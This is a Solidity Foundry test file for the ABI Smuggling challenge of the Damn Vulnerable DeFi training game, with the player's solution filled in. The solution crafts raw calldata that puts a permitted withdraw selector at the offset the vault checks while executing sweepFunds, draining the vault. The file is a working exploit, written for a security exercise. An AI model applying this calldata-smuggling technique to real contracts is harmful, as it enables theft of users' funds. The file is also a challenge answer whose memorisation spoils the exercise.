// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {
    SelfAuthorizedVault,
    AuthorizedExecutor,
    IERC20
} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

contract ABISmugglingChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy vault
        vault = new SelfAuthorizedVault();

        // Set permissions in the vault
        bytes32 deployerPermission = vault.getActionId(
            hex"85fb709d",
            deployer,
            address(vault)
        );
        bytes32 playerPermission = vault.getActionId(
            hex"d9caed12",
            player,
            address(vault)
        );
        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;
        vault.setPermissions(permissions);

        // Fund the vault with tokens
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Vault is initialized
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertTrue(vault.initialized());

        // Token balances are correct
        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), 0);

        // Cannot call Vault directly
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.sweepFunds(deployer, IERC20(address(token)));
        vm.prank(player);
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.withdraw(address(token), player, 1e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_abiSmuggling() public checkSolvedByPlayer {
        //sweep data contains the abi encoded calldata for sweepfunds
        bytes memory sweepData = abi.encodeCall(
            vault.sweepFunds,
            (recovery, IERC20(address(token)))
        );

        //Authorized Vault's extracts the selector using fixed calldata offset for authorization
        // But actual low level call runs at the ABI specified Offset

        // We craft calldata so the authorization check sees the permitted withdraw selector at byte offset 100, while actionData contains the sweepFunds calldata.

        bytes memory rawCallData = bytes.concat(
            //first we construct the outer call data

            //Selector for execute(address,bytes)
            bytes4(0x1cff79cd),
            //target contract address passed to execute
            bytes32(uint256(uint160(address(vault)))),
            // we set the ABI offset to 0x80 which points to absolute caldata byte offset 132 where dynamic length of inner calldata
            bytes32(uint256(0x80)),
            //  The following code which is part of crafting the rawCallData written in this manner because we want execute to extract a permitted operation while lowlevel call performs sweepFunds operation

            //we pad the next 32 bytes and then at byte offset100 place the The permitted 4-byte withdraw selector which is used to extract the action id used in validation
            bytes32(0),
            // The 4-byte withdraw selector, left-aligned in a 32-byte word, at absolute calldata offset 100.
            bytes32(uint256(uint32(0xd9caed12)) << 224),
            // Length of the dynamic actionData payload
            bytes32(uint256(sweepData.length)),
            //Actual actionData payload begins here, containing the sweepFunds selector and arguments.
            sweepData
        );
        (bool success, ) = address(vault).call(rawCallData);
        require(success, "call failed");
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All tokens taken from the vault and deposited into the designated recovery account
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(
            token.balanceOf(recovery),
            VAULT_TOKEN_BALANCE,
            "Not enough tokens in recovery account"
        );
    }
}
